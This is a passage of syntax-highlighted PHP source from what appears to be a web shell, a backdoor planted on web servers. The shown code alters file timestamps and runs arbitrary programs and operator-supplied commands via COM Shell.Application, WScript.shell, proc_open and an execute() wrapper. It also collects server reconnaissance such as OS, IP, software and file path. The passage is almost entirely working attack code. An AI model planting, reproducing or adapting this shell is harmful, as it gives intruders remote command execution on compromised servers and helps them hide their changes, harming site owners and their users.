<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'month'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;date(<span style="color: #8abeb7;">'m'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;2));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'day:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'day'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;date(<span style="color: #8abeb7;">'d'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;2));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'hour:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'hour'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;date(<span style="color: #8abeb7;">'H'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;2));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'minute:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'minute'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;date(<span style="color: #8abeb7;">'i'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;2))<span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'second:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'second'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;date(<span style="color: #8abeb7;">'s'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;2))<span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfooter();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   goback();
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end newtime</span>

<span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'shell'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">IS_WIN</span> &amp;&amp; <span style="color: #81a2be;">IS_COM</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">program</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">parameter</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shell</span>= <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">COM</span>(<span style="color: #8abeb7;">'Shell.Application'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">a</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shell</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">ShellExecute</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">program</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">parameter</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Program run has '</span>.(<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">a</span> ? <span style="color: #8abeb7;">'success'</span> : <span style="color: #8abeb7;">'fail'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">program</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">program</span> = <span style="color: #8abeb7;">'c:\windows\system32\cmd.exe'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">parameter</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">parameter</span> = <span style="color: #8abeb7;">'/c net start &gt; '</span>.<span style="color: #81a2be;">SA_ROOT</span>.<span style="color: #8abeb7;">'log.txt'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Execute Program'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'shell'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Program'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'program'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">program</span>,<span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">newline'</span><span style="text-decoration: underline;">=&gt;1));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Parameter'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'parameter'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">param</span><span style="color: #f0c674; text-decoration: underline;">eter</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'class'</span>=&gt;<span style="color: #8abeb7;">'bt'</span>,<span style="color: #8abeb7;">'type'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'value'</span>=<span style="text-decoration: underline;">&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'Execute'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Execute Command'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'shell'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">IS_WIN</span> &amp;&amp; <span style="color: #81a2be;">IS_COM</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">execfuncdb</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'phpfunc'</span>=&gt;<span style="color: #8abeb7;">'phpfunc'</span>,<span style="color: #8abeb7;">'wscript'</span>=&gt;<span style="color: #8abeb7;">'wscript'</span>,<span style="color: #8abeb7;">'proc_open</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'proc_open'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeselect(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Use:'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'execfunc'</span>,<span style="color: #8abeb7;">'option'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">execfuncd</span><span style="color: #f0c674; text-decoration: underline;">b</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">execfunc</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;1));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Command'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'command'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;htmlspecialcha<span style="text-decoration: underline;">rs(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">command</span><span style="text-decoration: underline;">)));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'class'</span>=&gt;<span style="color: #8abeb7;">'bt'</span>,<span style="color: #8abeb7;">'type'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #8abeb7;">'Ex</span><span style="color: #8abeb7; text-decoration: underline;">ecute'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">command</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;hr width="100%" noshade /&gt;&lt;pre&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">execfunc</span>==<span style="color: #8abeb7;">'wscript'</span> &amp;&amp; <span style="color: #81a2be;">IS_WIN</span> &amp;&amp; <span style="color: #81a2be;">IS_COM</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">wsh</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">COM</span>(<span style="color: #8abeb7;">'WScript.shell'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">exec</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">wsh</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">exec</span>(<span style="color: #8abeb7;">'cmd.exe /c '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">command</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">stdout</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">exec</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">StdOut</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">stroutput</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">stdout</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">ReadAll</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">stroutput</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">execfunc</span>==<span style="color: #8abeb7;">'proc_open'</span> &amp;&amp; <span style="color: #81a2be;">IS_WIN</span> &amp;&amp; <span style="color: #81a2be;">IS_COM</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">descriptorspec</span> = <span style="color: #b5bd68;">array</span>(
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>  0 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'pipe'</span>, <span style="color: #8abeb7;">'r'</span>),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>  1 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'pipe'</span>, <span style="color: #8abeb7;">'w'</span>),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>  2 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'pipe'</span>, <span style="color: #8abeb7;">'w'</span>)
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   );
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">process</span> = proc_open(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'COMSPEC'</span>], <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">descriptorspec</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pipes</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (is_resource(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">process</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   fwrite(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pipes</span>[0], <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">command</span>.<span style="color: #8abeb7;">"\r\n"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   fwrite(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pipes</span>[0], <span style="color: #8abeb7;">"exit\r\n"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   fclose(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pipes</span>[0]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> (<span style="color: #81a2be;">!</span>feof(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pipes</span>[1])) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> fgets(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pipes</span>[1], 1024);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   fclose(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pipes</span>[1]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> (<span style="color: #81a2be;">!</span>feof(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pipes</span>[2])) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> fgets(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pipes</span>[2], 1024);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   fclose(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pipes</span>[2]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   proc_close(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">process</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span>(execute(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">command</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/pre&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end shell</span>

<span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'phpenv'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">upsize</span>=getcfg(<span style="color: #8abeb7;">'file_uploads'</span>) ? getcfg(<span style="color: #8abeb7;">'upload_max_filesize'</span>) : <span style="color: #8abeb7;">'Not allowe</span><span style="color: #8abeb7; text-decoration: underline;">d'</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">adminmail</span>=<span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_ADMIN'</span>]) ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_ADMIN'</span>] : getc<span style="text-decoration: underline;">fg(</span><span style="color: #8abeb7; text-decoration: underline;">'sendmail_from'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dis_func</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dis_func</span> = <span style="color: #8abeb7;">'No'</span>;<span style="color: #de935f; background-color: #373b41;">     </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">info</span> = <span style="color: #b5bd68;">array</span>(
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   1 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Server Time'</span>,date(<span style="color: #8abeb7;">'Y/m/d h:i:s'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">timestamp</span>)),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   2 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Server Domain'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_NAME'</span>]),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   3 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Server IP'</span>,gethostbyname(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_NAME'</span>])),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   4 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Server OS'</span>,<span style="color: #81a2be;">PHP_OS</span>),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   5 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Server OS Charset'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_ACCEPT_LANGUAGE'</span>]),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   6 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Server Software'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_SOFTWARE'</span>]),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   7 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Server Web Port'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_PORT'</span>]),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   8 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'PHP run mode'</span>,strtoupper(php_sapi_name())),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   9 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'The file path'</span>,<span style="color: #81a2be;">__FILE__</span>),

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   10 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'PHP Version'</span>,<span style="color: #81a2be;">PHP_VERSION</span>),
